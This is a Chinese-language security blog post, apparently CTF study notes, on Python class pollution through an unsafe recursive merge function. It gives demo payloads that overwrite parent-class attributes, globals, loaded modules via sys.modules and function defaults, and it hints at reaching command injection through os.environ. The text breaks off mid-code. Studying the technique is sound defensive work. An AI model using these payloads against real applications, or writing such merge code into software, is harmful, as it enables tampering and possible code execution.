    <content type="html"><![CDATA[<h1 id="Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“"><a href="#Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“" class="headerlink" title="Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)"></a>Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)</h1><p>ä¸JavaScriptåŸå‹é“¾æ±¡æŸ“ç±»ä¼¼, pythonä¹Ÿå­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜</p><p>ä¸åŒçš„æ˜¯, pythonçš„åŸå‹é“¾æ±¡æŸ“å…¶å®æ˜¯ç±»æ±¡æŸ“, å¹¶ä¸”__åªèƒ½æ±¡æŸ“ä¸€äº›ç±»å±æ€§, è€Œå¯¹ç±»æ–¹æ³•æ— æ•ˆ__</p><p>ä¹‹å‰å­¦ä¹ sstiæ˜¯å°±çŸ¥é“ pythonå¯ä»¥é€šè¿‡ä¸€äº›é­”æœ¯æ–¹æ³•,ç±»æ–¹æ³•,ç±»å±æ€§å±‚å±‚è®¿é—®,ç›´åˆ°è°ƒç”¨åˆ°ä¸€äº›å±é™©å‡½æ•°</p><p>å› æ­¤pythonä¹Ÿå­˜åœ¨é“¾å¼è®¿é—®,æ›´æ”¹å±æ€§ç­‰é—®é¢˜</p><h2 id="mergeå‡½æ•°"><a href="#mergeå‡½æ•°" class="headerlink" title="mergeå‡½æ•°"></a>mergeå‡½æ•°</h2><p>åœ¨Javascriptä¸­, æœ€ä¸ºå¸¸è§çš„å°±æ˜¯å±æ€§åˆå¹¶å‡½æ•°(merge)é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±é€ æˆäº†é”®å€¼å¯¹å¯æ§,ä½¿å¾—å¯ä»¥å¯¹çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•è¿›è¡Œæ±¡æŸ“ä¿®æ”¹</p><p>åœ¨pythonä¸­, ä¹Ÿå­˜åœ¨è¿™æ ·çš„mergeå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment"># è‹¥vä»ç„¶æ˜¯ä¸€ä¸ªå­—å…¸, é€’å½’åœ°å°†å…¶å¤åˆ¶åˆ°dstä¸­</span></span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment"># å°†srcä¸‹çš„k væ·»åŠ åˆ°dstä¸­</span></span><br></pre></td></tr></table></figure><h2 id="æ±¡æŸ“ä¾‹å­"><a href="#æ±¡æŸ“ä¾‹å­" class="headerlink" title="æ±¡æŸ“ä¾‹å­"></a>æ±¡æŸ“ä¾‹å­</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="built_in">print</span>(tmp.secret)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#è¾“å‡º</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># world</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œé€šè¿‡tmp.__class__.__base__å°†å…¶çˆ¶ç±»(fatherç±»)ä¸‹çš„secretå±æ€§æ›´æ”¹é€ æˆæ±¡æŸ“</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„, é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥ä¿®æ”¹pythonçš„å†…ç½®å±æ€§</p><blockquote><p><code>__str__</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼ˆç‰¹æ®Šæ–¹æ³•ä¹Ÿç§°ä¸ºé­”æ³•æ–¹æ³•æˆ–é­”æœ¯æ–¹æ³•ï¼‰ä¹‹ä¸€ï¼Œåœ¨ Python ç±»ä¸­ç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚å½“ä½ è°ƒç”¨å†…ç½®çš„ <code>str()</code> å‡½æ•°æˆ– <code>print()</code> å‡½æ•°æ¥æ˜¾ç¤ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¯¥å¯¹è±¡çš„ <code>__str__</code> æ–¹æ³•ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;father&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># è¾“å‡º</span></span><br><span class="line"><span class="comment"># father</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><h2 id="æ— æ³•æ±¡æŸ“çš„objectå±æ€§"><a href="#æ— æ³•æ±¡æŸ“çš„objectå±æ€§" class="headerlink" title="æ— æ³•æ±¡æŸ“çš„objectå±æ€§"></a>æ— æ³•æ±¡æŸ“çš„objectå±æ€§</h2><p>å°è¯•æ±¡æŸ“Objectå±æ€§æ—¶, å°†ä¼šæç¤ºé”™è¯¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;pollution!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="å…¨å±€å˜é‡è·å–"><a href="#å…¨å±€å˜é‡è·å–" class="headerlink" title="å…¨å±€å˜é‡è·å–"></a>å…¨å±€å˜é‡è·å–</h2><blockquote><p>åœ¨<code>Python</code>ä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚<code>__init__</code>è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³<code>wrapper_descriptor</code>ï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•°<code>function</code>ï¼‰å‡å…·æœ‰ä¸€ä¸ª<code>__globals__</code>å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„<code>globals</code>å‡½æ•°çš„è¿”å›å€¼</p></blockquote><p><strong>_<em>globals</em>_</strong></p><blockquote><p><code>__globals__</code> æ˜¯ Python å‡½æ•°å¯¹è±¡ï¼ˆfunction objectï¼‰çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè·å–å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ï¼ˆglobal namespaceï¼‰ã€‚è¯¥å±æ€§è¿”å›ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå‡½æ•°åœ¨å®šä¹‰æ—¶çš„å…¨å±€å‘½åç©ºé—´ä¸­çš„ç¬¦å·è¡¨ï¼ˆsymbol tableï¼‰ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    target_secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line">instence = test()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;target_secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">merge(payload, instence)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="comment"># è¾“å‡º</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ²¡æœ‰ç»§æ‰¿å…³ç³»çš„ç±»å±æ€§ä¹Ÿè¢«æ±¡æŸ“äº†</p><h2 id="å·²åŠ è½½æ¨¡å—è·å–"><a href="#å·²åŠ è½½æ¨¡å—è·å–" class="headerlink" title="å·²åŠ è½½æ¨¡å—è·å–"></a>å·²åŠ è½½æ¨¡å—è·å–</h2><p>test_1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello, world!&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">tmp = a()</span><br><span class="line">merge(payload, a)</span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line"><span class="comment">#  è¾“å‡º</span></span><br><span class="line"><span class="comment"># hahaha</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å·²ç»åŠ è½½çš„æ¨¡å—ä¹Ÿä¼šè¢«æ±¡æŸ“</p><h2 id="æ¨¡å—åŠ è½½å…³ç³»å¤æ‚"><a href="#æ¨¡å—åŠ è½½å…³ç³»å¤æ‚" class="headerlink" title="æ¨¡å—åŠ è½½å…³ç³»å¤æ‚"></a>æ¨¡å—åŠ è½½å…³ç³»å¤æ‚</h2><blockquote><p><code>sys</code>æ¨¡å—çš„<code>modules</code>å±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å—</p></blockquote><p>åœ¨<code>import sys</code>çš„ç¨‹åºä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹payloadåœ¨å¤æ‚çš„æ¨¡å—å¯¼å…¥å…³ç³»ä¸­æ‰¾åˆ°ç›®æ ‡æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“"><a href="#å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“" class="headerlink" title="å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“"></a>å‡½æ•°å½¢å‚é»˜è®¤å€¼æ±¡æŸ“</h2><p>ä¸»è¦ç”¨åˆ°<code>__defaults__å’Œ__kwdefaults__</code>ä¸¤ä¸ªå†…ç½®å±æ€§</p><h3 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h3><blockquote><p><code>__defaults__</code>ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼å³å£°æ˜åœ¨ &#x2F; å * å‰çš„å‚æ•°é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚+é”®å€¼å½¢å‚</p></blockquote><h3 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h3><blockquote><p><code>__kwdefaults__</code>ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼, å³å£°æ˜åœ¨* åçš„å‚æ•°é»˜è®¤å€¼çš„é”®å€¼å¯¹ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š</p></blockquote><p>ç¤ºä¾‹payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡os-environä¿®æ”¹ç¯å¢ƒå˜é‡"><a href="#é€šè¿‡os-environä¿®æ”¹ç¯å¢ƒå˜é‡" class="headerlink" title="é€šè¿‡os.environä¿®æ”¹ç¯å¢ƒå˜é‡"></a>é€šè¿‡os.environä¿®æ”¹ç¯å¢ƒå˜é‡</h2><p>é€šè¿‡æ±¡æŸ“os.environæ¥ä¿®æ”¹ç¯å¢ƒå˜é‡LD_PROLOADä¸ä¸Šä¼ .soåŠ«æŒç­‰æ‰©å±•æ”»å‡»é¢</p><p>è¿™é‡Œçœ‹è§äº†ä¸€ä¸ªä¾‹å­ é€šè¿‡os.environå¯¼è‡´å‘½ä»¤æ³¨å…¥:</p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><figure class="highlight 